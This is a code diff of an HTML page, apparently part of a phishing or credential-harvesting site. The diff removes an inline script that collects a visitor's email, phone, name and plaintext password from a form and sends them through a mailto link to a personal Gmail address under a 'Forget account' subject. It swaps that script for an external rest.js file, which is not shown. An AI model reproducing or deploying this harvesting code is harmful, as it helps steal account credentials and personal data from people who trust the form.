@@ -29,31 +29,8 @@
         <input placeholder="Password" type="password" id="password"/><br>
         <button onclick="sendData()">Send</button>
    </blockquote> 
-   <script>
-    function sendData() {
-        var data1 = document.getElementById("email").value;
-        var data2 = document.getElementById("phone").value;
-        var data3 = document.getElementById("name").value;
-        var data4 = document.getElementById("password").value;
-        var selectElement = document.getElementById("cng");
-        var data5 = selectElement.options[selectElement.selectedIndex].value;
-
-        // Encode data for safe transmission
-        var subject = encodeURIComponent(`Forget account by ${data2}!`);
-        var body = encodeURIComponent(
-            `CNG Option: ${data5}%0A` + // %0A represents a new line
-            `Email: ${data1}%0A` +
-            `Phone: ${data2}%0A` +
-            `Name: ${data3}%0A` +
-            `Password: ${data4}`
-        );
-
-        // Construct mailto URL
-        var mailtoLink = `mailto:cryptocashp2p@gmail.com?subject=${subject}&body=${body}`;
-
-        // Open default email client
-        window.location.href = mailtoLink;
-    }
+   <script src="rest.js">
+   
    </script>
 </body>
 </html>
